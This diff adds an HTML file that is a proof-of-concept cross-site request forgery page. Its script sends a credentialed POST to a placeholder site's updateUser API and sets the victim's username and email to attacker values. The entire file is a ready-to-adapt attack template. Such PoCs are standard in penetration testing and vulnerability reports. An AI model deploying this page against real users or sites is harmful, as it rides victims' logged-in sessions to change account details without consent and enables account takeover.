@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <h1>CSRF Poc with JSON parameters and cookies</h1>
+    <script>
+      function sendRequest() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://example.com/api/updateUser", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.withCredentials = true;
+        xhr.send(JSON.stringify({
+          "username": "hacker",
+          "email": "hacker@example.com"
+        }));
+      }
+    </script>
+    <button onclick="sendRequest()">Update User</button>
+  </body>
+</html>
